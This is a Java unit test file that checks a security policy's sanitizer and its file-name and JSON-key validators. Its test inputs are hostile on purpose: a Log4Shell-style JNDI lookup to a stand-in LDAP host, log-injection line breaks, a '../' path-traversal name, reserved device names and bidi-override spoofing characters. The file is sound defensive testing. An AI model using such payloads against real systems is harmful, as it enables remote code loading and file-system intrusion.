package dev.chise.chisetweaks;

import dev.chise.chisetweaks.core.security.RuntimeSecurityPolicy;
import org.junit.jupiter.api.Test;

import java.text.Normalizer;

import static org.junit.jupiter.api.Assertions.*;

final class RuntimeSecurityPolicyTest {
    @Test
    void sanitizesLogAndDiagnosticInjectionCharactersWithinAHardBound() {
        String hostile = "prefix\r\n${jndi:ldap://example.test/a}\u202E\u200B\uFEFF" + "x".repeat(300);
        String sanitized = RuntimeSecurityPolicy.sanitizeDiagnosticValue(hostile);

        assertFalse(sanitized.contains("\r"));
        assertFalse(sanitized.contains("\n"));
        assertFalse(sanitized.contains("${"));
        assertFalse(sanitized.contains("\u202E"));
        assertFalse(sanitized.contains("\u200B"));
        assertFalse(sanitized.contains("\uFEFF"));
        assertTrue(sanitized.length() <= RuntimeSecurityPolicy.MAX_DIAGNOSTIC_VALUE_CHARS);
        assertEquals("", RuntimeSecurityPolicy.sanitizeDiagnosticValue(null));
    }

    @Test
    void acceptsOrdinaryLeafFileNames() {
        assertTrue(RuntimeSecurityPolicy.isSafeLeafFileName("chisetweaks.json"));
        assertTrue(RuntimeSecurityPolicy.isSafeLeafFileName("profile.v2.json"));
        assertTrue(RuntimeSecurityPolicy.isSafeLeafFileName("設定.json"));
    }

    @Test
    void rejectsTraversalReservedAndAmbiguousLeafFileNames() {
        String decomposed = Normalizer.normalize("é.json", Normalizer.Form.NFD);

        assertFalse(RuntimeSecurityPolicy.isSafeLeafFileName(null));
        assertFalse(RuntimeSecurityPolicy.isSafeLeafFileName(""));
        assertFalse(RuntimeSecurityPolicy.isSafeLeafFileName("../config.json"));
        assertFalse(RuntimeSecurityPolicy.isSafeLeafFileName("config..json"));
        assertFalse(RuntimeSecurityPolicy.isSafeLeafFileName("folder/config.json"));
        assertFalse(RuntimeSecurityPolicy.isSafeLeafFileName("folder\\config.json"));
        assertFalse(RuntimeSecurityPolicy.isSafeLeafFileName(" config.json"));
        assertFalse(RuntimeSecurityPolicy.isSafeLeafFileName("config.json "));
        assertFalse(RuntimeSecurityPolicy.isSafeLeafFileName("config.json."));
        assertFalse(RuntimeSecurityPolicy.isSafeLeafFileName("CON"));
        assertFalse(RuntimeSecurityPolicy.isSafeLeafFileName("con.json"));
        assertFalse(RuntimeSecurityPolicy.isSafeLeafFileName("COM1.txt"));
        assertFalse(RuntimeSecurityPolicy.isSafeLeafFileName("NUL.log"));
        assertFalse(RuntimeSecurityPolicy.isSafeLeafFileName(decomposed));
        assertFalse(RuntimeSecurityPolicy.isSafeLeafFileName("evil\u202Ejson"));
        assertFalse(RuntimeSecurityPolicy.isSafeLeafFileName("bad\uFDD0.json"));
        assertFalse(RuntimeSecurityPolicy.isSafeLeafFileName("a".repeat(129)));
    }

    @Test
    void jsonObjectKeysRejectInvisibleControlsAndNonNormalizedText() {
        String decomposed = Normalizer.normalize("é", Normalizer.Form.NFD);

        assertTrue(RuntimeSecurityPolicy.isSafeJsonObjectKey("placement_guide"));
        assertTrue(RuntimeSecurityPolicy.isSafeJsonObjectKey("日本語キー"));
        assertFalse(RuntimeSecurityPolicy.isSafeJsonObjectKey(null));
        assertFalse(RuntimeSecurityPolicy.isSafeJsonObjectKey("   "));
        assertFalse(RuntimeSecurityPolicy.isSafeJsonObjectKey("a".repeat(129)));
        assertFalse(RuntimeSecurityPolicy.isSafeJsonObjectKey(decomposed));
        assertFalse(RuntimeSecurityPolicy.isSafeJsonObjectKey("line\nfeed"));
        assertFalse(RuntimeSecurityPolicy.isSafeJsonObjectKey("bad\u202Ekey"));
        assertFalse(RuntimeSecurityPolicy.isSafeJsonObjectKey("bad\u2066key"));
        assertFalse(RuntimeSecurityPolicy.isSafeJsonObjectKey("zero\u200Bwidth"));
        assertFalse(RuntimeSecurityPolicy.isSafeJsonObjectKey("join\u200Dkey"));
        assertFalse(RuntimeSecurityPolicy.isSafeJsonObjectKey("bom\uFEFFkey"));
        assertFalse(RuntimeSecurityPolicy.isSafeJsonObjectKey("bad\uFFFFkey"));
    }
}
